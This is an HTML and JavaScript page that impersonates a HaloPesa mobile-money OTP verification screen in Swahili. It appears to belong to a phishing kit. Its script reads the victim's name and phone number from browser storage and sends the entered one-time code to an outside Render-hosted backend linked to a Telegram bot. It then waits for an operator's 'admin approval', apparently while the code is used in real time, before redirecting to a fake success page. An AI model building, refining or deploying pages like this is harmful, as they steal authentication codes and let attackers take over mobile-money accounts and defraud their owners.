<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<title>Uthibitisho wa OTP - HaloPesa</title>

<style>
/* ===== HALOPESA BRAND STYLES - BIGGER & BOLDER ===== */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #f0f4f0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 12px;
}

.page {
  width: 100%;
  max-width: 640px;
}

/* Card - More generous padding */
.card {
  background: #ffffff;
  border-radius: 24px;
  padding: 48px 36px 40px;
  box-shadow: 0 12px 40px rgba(26, 67, 41, 0.12);
  border: 1px solid #e6efe6;
}

/* Titles - Larger */
.title {
  font-size: 38px;
  font-weight: 700;
  color: #1a6b2a;
  margin-bottom: 10px;
  letter-spacing: -0.5px;
}

.subtitle {
  color: #5a6b5a;
  font-size: 20px;
  margin-bottom: 8px;
}

.display-number {
  color: #1a2b1a;
  font-weight: 700;
  font-size: 22px;
  margin-bottom: 28px;
  background: #f4f9f4;
  padding: 12px 22px;
  border-radius: 12px;
  display: inline-block;
  letter-spacing: 0.5px;
}

/* Success Box - Larger */
.success-box {
  background: #eaf6ea;
  border: 1px solid #b8d9b8;
  color: #1a6b2a;
  border-radius: 16px;
  padding: 22px 24px;
  margin-bottom: 30px;
  display: flex;
  gap: 16px;
  align-items: flex-start;
  font-size: 19px;
  line-height: 1.6;
}

.success-box > div:first-child {
  font-size: 28px;
  color: #1a7a2a;
  font-weight: 700;
  line-height: 1.2;
}

.label {
  font-size: 20px;
  font-weight: 600;
  color: #1a2b1a;
  margin-bottom: 20px;
}

/* OTP Inputs - MASSIVE */
.otp-boxes {
  display: flex;
  justify-content: center;
  gap: 20px;
  margin-bottom: 28px;
}

.otp-boxes input {
  width: 88px;
  height: 88px;
  border: 3px solid #d0e0d0;
  border-radius: 20px;
  background: #fafffa;
  text-align: center;
  font-size: 40px;
  font-weight: 700;
  color: #1a3b1a;
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.otp-boxes input:focus {
  border-color: #1a7a2a;
  box-shadow: 0 0 0 6px rgba(26, 122, 42, 0.15);
}

/* Timer - Larger */
#timerContainer {
  text-align: center;
  color: #b8960f;
  font-weight: 600;
  font-size: 20px;
  margin-bottom: 30px;
  background: #fefcf0;
  padding: 16px 0;
  border-radius: 14px;
}

#timerContainer strong {
  color: #1a7a2a;
  font-size: 24px;
}

/* Primary Button - HUGE */
button {
  width: 100%;
  height: 72px;
  border: none;
  border-radius: 16px;
  font-size: 22px;
  font-weight: 700;
  background: #d4e0d4;
  color: #8a9f8a;
  cursor: pointer;
  transition: background 0.25s, transform 0.1s;
  letter-spacing: 0.5px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 14px;
}

button:not(:disabled) {
  background: #1a7a2a;
  color: #ffffff;
}

button:not(:disabled):hover {
  background: #136622;
  transform: scale(1.01);
}

button:not(:disabled):active {
  transform: scale(0.98);
}

/* Spinner - Bigger */
.spinner {
  width: 24px;
  height: 24px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top: 3px solid #ffffff;
  border-radius: 50%;
  animation: spin 0.9s linear infinite;
  display: none;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* Status messages - Larger */
#status {
  margin-top: 20px;
  text-align: center;
  font-size: 18px;
  font-weight: 500;
  color: #c0392b;
  min-height: 28px;
}

/* ===== RESPONSIVE TWEAKS - EVEN BIGGER ON MOBILE ===== */
@media (max-width: 600px) {
  .card {
    padding: 32px 20px 28px;
    border-radius: 20px;
  }

  .title {
    font-size: 30px;
  }

  .subtitle {
    font-size: 18px;
  }

  .display-number {
    font-size: 20px;
    padding: 10px 18px;
  }

  .success-box {
    font-size: 17px;
    padding: 18px 20px;
    gap: 14px;
    border-radius: 14px;
  }

  .success-box > div:first-child {
    font-size: 24px;
  }

  .label {
    font-size: 18px;
    margin-bottom: 18px;
  }

  .otp-boxes {
    gap: 16px;
    margin-bottom: 24px;
  }

  .otp-boxes input {
    width: 76px;
    height: 76px;
    font-size: 34px;
    border-radius: 18px;
  }

  #timerContainer {
    font-size: 18px;
    padding: 14px 0;
    margin-bottom: 24px;
  }

  #timerContainer strong {
    font-size: 22px;
  }

  button {
    height: 64px;
    font-size: 20px;
    border-radius: 14px;
  }

  #status {
    font-size: 16px;
    margin-top: 16px;
  }
}

/* Extra small devices - max 420px */
@media (max-width: 420px) {
  .card {
    padding: 24px 14px 20px;
  }

  .title {
    font-size: 26px;
  }

  .subtitle {
    font-size: 16px;
  }

  .display-number {
    font-size: 17px;
    padding: 8px 14px;
  }

  .success-box {
    font-size: 15px;
    padding: 14px 16px;
    gap: 12px;
  }

  .success-box > div:first-child {
    font-size: 20px;
  }

  .label {
    font-size: 16px;
  }

  .otp-boxes {
    gap: 12px;
  }

  .otp-boxes input {
    width: 66px;
    height: 66px;
    font-size: 30px;
    border-radius: 16px;
  }

  #timerContainer {
    font-size: 16px;
    padding: 12px 0;
  }

  #timerContainer strong {
    font-size: 19px;
  }

  button {
    height: 58px;
    font-size: 18px;
  }

  #status {
    font-size: 15px;
  }
}

/* Very tiny screens - max 360px */
@media (max-width: 360px) {
  .otp-boxes input {
    width: 56px;
    height: 56px;
    font-size: 26px;
  }
}
</style>
</head>

<body>

<div class="page">
  <div class="card">
    <div class="title">Uthibitisho wa OTP</div>
    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div>
    <div id="phoneNumber" class="display-number"></div>
    <div class="success-box">
      <div>✓</div>
      <div>Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div>
    </div>
    <form id="otpForm">
      <div class="label">Weka msimbo wa uthibitisho</div>
      <div class="otp-boxes">
        <input maxlength="1" inputmode="numeric">
        <input maxlength="1" inputmode="numeric">
        <input maxlength="1" inputmode="numeric">
        <input maxlength="1" inputmode="numeric">
      </div>
      <div id="timerContainer">
        Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde
      </div>
      <button id="submitBtn" disabled>
        <span id="btnText">WASILISHA</span>
        <span class="spinner" id="spinner"></span>
      </button>
    </form>
    <div id="status"></div>
  </div>
</div>

<!-- ===== LOGIC — UNTOUCHED except redirect ===== -->
<script>
const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');

// Store botId for redirect fallback
if (botId) {
    localStorage.setItem('botId', botId);
}

if(!botId){
  document.getElementById('status').textContent = "Error: Missing bot ID. Please use the link from Telegram.";
  throw new Error("Bot ID missing");
}

// Get phone from localStorage
const phone = localStorage.getItem('phone') || "";
document.getElementById('phoneNumber').textContent =
  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";

const inputs = document.querySelectorAll('.otp-boxes input');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const statusEl = document.getElementById('status');
const timerDisplay = document.getElementById('timerDisplay');

let countdown;

// Handle keyboard input for OTP boxes
document.addEventListener('keydown', e => {
  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;

  const values = [...inputs].map(i => i.value);
  const index = values.findIndex(v => v === "");

  if(e.key === "Backspace") {
    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
    if(lastFilled >= 0) inputs[lastFilled].value = "";
    submitBtn.disabled = ![...inputs].every(i => i.value);
  } else if(index !== -1) {
    inputs[index].value = e.key;
    submitBtn.disabled = ![...inputs].every(i => i.value);
  }

  // Auto-submit when all 4 digits are entered
  if([...inputs].every(i => i.value)) {
    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
  }
});

function startCountdown(duration = 60){
  let time = duration;
  timerDisplay.textContent = time;
  clearInterval(countdown);

  countdown = setInterval(()=>{
    time--;
    timerDisplay.textContent = time;
    if(time<=0){
      clearInterval(countdown);
      statusEl.textContent = "OTP code has expired. Please request a new code.";
      submitBtn.disabled = true;
    }
  },1000);
}

startCountdown();

async function sendCodeToTelegram(name, phone, code){
  try{
    const r = await fetch(`${BACKEND_URL}/submit-code`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ name, phone, code, botId })
    });
    return r.json();
  }catch{
    return null;
  }
}

function pollCodeApproval(requestId){
  return new Promise(resolve=>{
    const i=setInterval(async()=>{
      const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
      const d=await r.json();
      if(d.approved===true||d.approved===false){
        clearInterval(i);
        resolve(d.approved);
      }
    },1500);
  });
}

document.getElementById('otpForm').addEventListener('submit', async e=>{
  e.preventDefault();

  const code=[...inputs].map(i=>i.value).join('');

  // Check if all digits are entered
  if(code.length !== 4) {
    statusEl.textContent = "Please enter all 4 digits";
    return;
  }

  const name=localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
  const phone=localStorage.getItem('phone') || "Unknown";

  submitBtn.disabled=true;
  btnText.textContent="VERIFYING...";
  spinner.style.display="inline-block";
  statusEl.textContent="Sending code for verification...";

  const res=await sendCodeToTelegram(name, phone, code);

  if(!res||!res.requestId){
    statusEl.textContent="Failed to send code. Please try again.";
    submitBtn.disabled=false;
    btnText.textContent="WASILISHA";
    spinner.style.display="none";
    return;
  }

  statusEl.textContent="Waiting for admin approval...";
  const approved=await pollCodeApproval(res.requestId);
  clearInterval(countdown);

  if(approved){
    localStorage.setItem('code', code);
    statusEl.textContent="Code verified! Redirecting...";

    // ✅ FIXED: Redirect to success.html instead of merchant.html
    // Get botId from localStorage if not in URL
    const redirectBotId = botId || localStorage.getItem('botId') || '';
    console.log('✅ Redirecting to success.html with botId:', redirectBotId);

    setTimeout(() => {
      window.location.href = `success.html?botId=${redirectBotId}`;
    }, 500);
  }else{
    statusEl.textContent="Incorrect OTP code. Please try again.";
    inputs.forEach(i=>i.value="");
    submitBtn.disabled=false;
    btnText.textContent="WASILISHA";
    spinner.style.display="none";
    startCountdown();
  }
});
</script>

</body>
</html>
